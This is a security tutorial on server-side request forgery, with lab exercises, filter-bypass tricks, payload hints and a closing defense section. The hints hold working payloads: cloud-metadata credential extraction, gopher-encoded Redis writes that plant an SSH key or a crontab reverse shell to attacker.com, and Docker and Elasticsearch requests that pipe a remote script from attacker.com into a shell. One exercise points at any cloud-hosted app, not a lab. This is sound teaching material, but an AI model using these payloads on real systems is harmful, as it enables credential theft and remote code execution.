# 🌐 Server-Side Request Forgery (SSRF) Tutorial

**Difficulty**: ⭐⭐⭐⭐ (Intermediate)  
**Time Required**: 2-3 hours  
**Applications**: SSRF Lab, WebGoat, DVWA

## 📚 Table of Contents
1. [What is SSRF?](#what-is-ssrf)
2. [How SSRF Works](#how-ssrf-works)
3. [Types of SSRF](#types-of-ssrf)
4. [Common Attack Scenarios](#common-attack-scenarios)
5. [Hands-On Practice](#hands-on-practice)
6. [Defense Strategies](#defense-strategies)
7. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand SSRF vulnerabilities and their impact
- ✅ Identify SSRF injection points
- ✅ Access internal services and cloud metadata
- ✅ Bypass common SSRF filters
- ✅ Implement secure URL handling

---

## What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make requests from the vulnerable server to unintended locations. The server acts as a proxy, potentially accessing internal resources, cloud metadata, or external services.

### 🎬 Real-World Impact

Major SSRF incidents:
- **Capital One (2019)**: SSRF to AWS metadata led to 100M records breach
- **Shopify (2019)**: SSRF in Exchange servers - $25,000 bounty
- **GitLab (2017)**: SSRF allowing internal network scanning
- **Uber (2016)**: SSRF to access AWS credentials

### 🔍 Where SSRF Occurs

Common SSRF locations:
- 🖼️ Image/document fetchers
- 🔗 URL shorteners/preview generators
- 📊 PDF generators
- 🌐 Webhooks
- 📦 Import from URL features
- 🔄 Proxy services

---

## How SSRF Works

### Vulnerable Code Examples

**PHP:**
```php
// BAD: No validation
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```

**Python:**
```python
# BAD: Direct request
import requests
url = request.args.get('url')
response = requests.get(url)
return response.text
```

**Node.js:**
```javascript
// BAD: Unvalidated URL
const axios = require('axios');
app.get('/fetch', async (req, res) => {
    const data = await axios.get(req.query.url);
    res.send(data.data);
});
```

### Attack Flow

1. **Attacker** provides malicious URL to the application
2. **Server** makes request to the attacker-controlled URL
3. **Internal resources** become accessible through the server
4. **Attacker** receives data from internal network

---

## Types of SSRF

### 1. Basic SSRF
Direct response returned to attacker

### 2. Blind SSRF
No response returned, but request is made

### 3. Semi-Blind SSRF
Limited information through timing/errors

### 4. SSRF with Protocol Smuggling
Using different protocols (file://, gopher://, etc.)

---

## Common Attack Scenarios

### 🎯 Internal Network Access
```
http://192.168.1.10/admin
http://10.0.0.5:8080/
http://localhost:6379/ (Redis)
http://localhost:9200/ (Elasticsearch)
```

### ☁️ Cloud Metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2019-06-01

# Digital Ocean
http://169.254.169.254/metadata/v1/
```

### 🔧 Internal Services
```
# Databases
http://localhost:3306/ (MySQL)
http://localhost:5432/ (PostgreSQL)
http://localhost:27017/ (MongoDB)

# Message Queues
http://localhost:5672/ (RabbitMQ)
http://localhost:9092/ (Kafka)

# Monitoring
http://localhost:9090/ (Prometheus)
http://localhost:3000/ (Grafana)
```

---

## Hands-On Practice

### 🏃 Exercise 1: Basic SSRF Detection (SSRF Lab)

**Setup**: Start SSRF Lab application  
**Goal**: Confirm SSRF vulnerability exists

:::hint 💡 Hint 1: Find URL input points
Look for features that:
- Fetch images from URLs
- Generate previews of links
- Import data from external sources
- Create PDFs from web pages

Common parameters: `url=`, `src=`, `href=`, `path=`

:::

:::hint 💡 Hint 2: Test with your own server
Set up a simple server to receive requests:
```bash
# Python
python3 -m http.server 8000

# Netcat
nc -lvnp 8000

# ngrok for external access
ngrok http 8000
```

:::

:::hint 💡 Hint 3: Check different protocols
Try various URL schemes:
- `http://your-server.com`
- `https://your-server.com`
- `file:///etc/passwd`
- `ftp://your-server.com`

:::

:::hint 🔓 Hint 4
**Step 1**: Find the vulnerable parameter
```
http://vulnerable-app.com/fetch?url=http://your-server.com
```

**Step 2**: Confirm callback
Check your server logs:
```
127.0.0.1 - - [Date] "GET / HTTP/1.1" 200
User-Agent: Python-urllib/3.8
```

**Step 3**: Test internal access
```
http://vulnerable-app.com/fetch?url=http://localhost:80
http://vulnerable-app.com/fetch?url=http://127.0.0.1:80
http://vulnerable-app.com/fetch?url=http://[::1]:80
```

**Step 4**: Check response differences
- Different response size = different content
- Error messages might leak information
- Timing can indicate open/closed ports

:::

---

### 🏃 Exercise 2: Cloud Metadata Extraction (Any Cloud App)

**Setup**: Find an application hosted on AWS/GCP/Azure  
**Goal**: Extract cloud credentials via SSRF

:::hint 💡 Hint 1: Know the metadata endpoints
Each cloud provider has specific metadata URLs:
- AWS: `169.254.169.254`
- GCP: `metadata.google.internal`
- Azure: Also uses `169.254.169.254`

Start with the base URL and explore the structure.

:::

:::hint 💡 Hint 2: Required headers
Some clouds require special headers:

**Google Cloud:**
```
Metadata-Flavor: Google
```

**Azure:**
```
Metadata: true
```

How can you add headers in SSRF?

:::

:::hint 💡 Hint 3: Navigate the metadata tree
Metadata is hierarchical. Start broad:
```
/latest/
/latest/meta-data/
/latest/meta-data/iam/
```

Look for security credentials!

:::

:::hint 🔓 Hint 4
**AWS Metadata Extraction:**
```
# Get IAM role name
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
}
```

**Google Cloud:**
```
# Using gopher for headers
gopher://metadata.google.internal:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0AMetadata-Flavor: Google%0A%0A

# Or if the app sets headers
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2019-06-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**Using the stolen credentials:**
```bash
# AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls
```

:::

---

### 🏃 Exercise 3: Bypassing SSRF Filters (WebGoat)

**Setup**: Navigate to SSRF lesson with filters  
**Goal**: Bypass blacklist/whitelist filters

:::hint 💡 Hint 1: Alternative representations
If `localhost` is blocked, try:
- `127.0.0.1`
- `127.1`
- `0.0.0.0`
- `[::]`
- `0`

For IP addresses, consider different formats!

:::

:::hint 💡 Hint 2: DNS tricks
You can use:
- Your own domain pointing to 127.0.0.1
- xip.io service: `127.0.0.1.xip.io`
- nip.io service: `127.0.0.1.nip.io`
- Unicode characters in domain names

:::

:::hint 💡 Hint 3: Parser confusion
Different parsers handle URLs differently:
```
http://google.com#@evil.com/
http://evil.com%23.google.com/
http://google.com@evil.com/
http://google.com\@evil.com/
```

Which part is the real host?

:::

:::hint 🔓 Hint 4
**IP Address Representations:**
```
# Decimal
http://2130706433/  # 127.0.0.1
http://3232235777/  # 192.168.1.1

# Hexadecimal
http://0x7f000001/  # 127.0.0.1

# Octal
http://0177.0.0.1/  # 127.0.0.1

# Mixed
http://127.1/  # 127.0.0.1
http://127.0.1/ # 127.0.0.1
```

**DNS Bypass:**
```
# Register your domain
A record: ssrf.attacker.com -> 127.0.0.1

# Use wildcard DNS
http://127.0.0.1.xip.io/
http://localhost.localtest.me/
```

**URL Parser Bypass:**
```
# @ confusion
http://expected.com@127.0.0.1/
http://127.0.0.1#@expected.com/

# Encoded characters
http://127.0.0.1%2eevil.com/
http://127.0.0%0a.1/

# Case variations (if poorly implemented)
http://LoCaLhOsT/
```

**Protocol Bypass:**
```
# If http://localhost is blocked
file://localhost/etc/passwd
gopher://localhost:6379/
dict://localhost:11211/

# URL shorteners
http://bit.ly/[shortened-localhost-url]
```

**Advanced - Time of check vs time of use:**
```python
# First request: Return safe URL for check
# Second request: Return malicious URL
# Some apps check URL then fetch it separately!
```

:::

---

### 🏃 Exercise 4: Blind SSRF Exploitation

**Setup**: Application that doesn't return response  
**Goal**: Confirm SSRF and extract data without direct response

:::hint 💡 Hint 1: Out-of-band detection
Even without response, you can detect SSRF:
- DNS lookups to your domain
- HTTP requests to your server
- Timing differences

Set up monitoring!

:::

:::hint 💡 Hint 2: Port scanning via timing
Open vs closed ports have different timings:
- Open port: Quick response or timeout
- Closed port: Quick "connection refused"
- Filtered: Slow timeout

Measure the response time!

:::

:::hint 💡 Hint 3: Error-based extraction
Different errors might leak information:
- "Connection refused" = Port closed
- "Timeout" = Port filtered/host down
- "Invalid response" = Port open but wrong protocol

:::

:::hint 🔓 Hint 4
**DNS Exfiltration Setup:**
```bash
# Use Burp Collaborator or:
# Set up NS record for subdomain
# Monitor DNS queries
```

**Payload for DNS exfiltration:**
```
http://internal-data.your-domain.com/
http://port-8080-open.your-domain.com/
```

**Time-based port scanning:**
```python
import time
ports = [22, 80, 443, 3306, 6379, 8080]

for port in ports:
    start = time.time()
    # Make SSRF request to http://internal:port
    response_time = time.time() - start
    
    if response_time < 1:
        print(f"Port {port}: Open or closed")
    else:
        print(f"Port {port}: Filtered or timeout")
```

**Using Gopher for data extraction:**
```
# Redis commands via gopher
gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A

# SMTP to send emails
gopher://localhost:25/_HELO%20localhost%0D%0AMAIL%20FROM%3A%3Cssrf@example.com%3E%0D%0ARCPT%20TO%3A%3Cattacker@evil.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%0D%0A%0D%0AInternal%20data%20here%0D%0A.%0D%0AQUIT%0D%0A
```

**Blind SSRF chains:**
```
1. SSRF to internal service
2. Internal service makes external request
3. Monitor for callbacks

Example: SSRF -> Internal webhook -> Your server
```

:::

---

### 🏃 Challenge: SSRF to RCE

**Goal**: Achieve remote code execution through SSRF

:::hint 🎯 Hint 1
Can you escalate SSRF to RCE by:
1. Accessing internal services
2. Exploiting those services
3. Chaining vulnerabilities

Think about what internal services might be vulnerable!

:::

:::hint 💡 Hint 2
Common vulnerable services:
- Redis (no auth) - Can write to disk
- Memcached - Cache poisoning
- Elasticsearch - Script execution
- Docker API - Container creation
- Jenkins - Script console

:::

:::hint 🔓 Hint 3
**Method 1: Redis RCE**
```
# Write SSH key
gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$[SSH_KEY_LENGTH]%0d%0a[SSH_PUBLIC_KEY]%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$13%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Write crontab
gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Method 2: Docker API RCE**
```json
POST http://localhost:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "curl attacker.com/shell.sh | sh"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"]
  }
}
```

**Method 3: Elasticsearch RCE**
```
# Groovy script execution (older versions)
POST http://localhost:9200/_search
{
  "script_fields": {
    "test": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl attacker.com/shell.sh | sh\")"
    }
  }
}
```

**Method 4: Internal application chain**
```
SSRF -> Internal Jenkins -> Script Console -> RCE
SSRF -> Internal GitLab -> Import repo with .gitlab-ci.yml -> RCE
SSRF -> Internal app with SQL injection -> xp_cmdshell -> RCE
```

:::

---

## Defense Strategies

### 🛡️ Input Validation

```python
from urllib.parse import urlparse
import ipaddress
import socket

def is_safe_url(url):
    # Parse URL
    parsed = urlparse(url)
    
    # Check protocol
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Resolve hostname
    try:
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)
        
        # Block private IPs
        if ip_obj.is_private or ip_obj.is_loopback:
            return False
            
        # Block cloud metadata
        if str(ip_obj) == '169.254.169.254':
            return False
            
    except:
        return False
        
    return True
```

### 🛡️ Network Segmentation

```yaml
# Docker network isolation
services:
  web:
    networks:
      - frontend
  internal-service:
    networks:
      - backend
      
networks:
  frontend:
    external: true
  backend:
    internal: true
```

### 🛡️ Whitelist Approach

```javascript
const ALLOWED_DOMAINS = [
    'api.trusted-service.com',
    'cdn.example.com'
];

function isAllowedUrl(url) {
    const parsed = new URL(url);
    return ALLOWED_DOMAINS.includes(parsed.hostname);
}
```

### 🛡️ Additional Protections

1. **Use a Proxy**
   - Route all external requests through a proxy
   - Apply filtering at proxy level

2. **Disable Unnecessary Protocols**
   ```php
   // PHP - Disable dangerous wrappers
   allow_url_fopen = Off
   ```

3. **Response Validation**
   - Validate content-type
   - Limit response size
   - Timeout requests

4. **IMDSv2 for AWS**
   - Require session token
   - Prevents basic SSRF to metadata

---

## 📊 SSRF Cheat Sheet

### URL Bypass Techniques
| Technique | Example |
|-----------|---------|
| IP Decimal | `http://2130706433` |
| IP Hex | `http://0x7f000001` |
| IP Octal | `http://0177.0.0.1` |
| Short IP | `http://127.1` |
| IPv6 | `http://[::1]` |
| DNS | `http://localtest.me` |
| URL Encode | `http://127.0.0.1%2f` |
| Case | `http://LoCaLhOsT` |

### Useful Ports to Check
| Port | Service | Exploit Potential |
|------|---------|-------------------|
| 22 | SSH | Banner grabbing |
| 80/443 | HTTP/S | Web applications |
| 3306 | MySQL | Data access |
| 5432 | PostgreSQL | Data access |
| 6379 | Redis | RCE possible |
| 9200 | Elasticsearch | Data/RCE |
| 27017 | MongoDB | Data access |

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify SSRF vulnerable parameters
- [ ] Access internal services via SSRF
- [ ] Extract cloud metadata
- [ ] Bypass common SSRF filters
- [ ] Implement secure URL validation

---

## Additional Resources

### 🔧 Tools
- **SSRFmap**: Automated SSRF fuzzer
- **Gopherus**: Gopher payload generator
- **Burp Collaborator**: Out-of-band detection
- **interactsh**: Open-source alternative

### 📖 Further Reading
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [Orange Tsai's SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/)

### 🎥 Video Resources
- [Nahamsec - SSRF Tutorial](https://www.youtube.com/watch?v=ih5R_c16bKc)
- [LiveOverflow - SSRF Explained](https://www.youtube.com/watch?v=PF8i3Dkv7Ps)

---

**Next Tutorial**: [Insecure Deserialization](deserialization.md) → 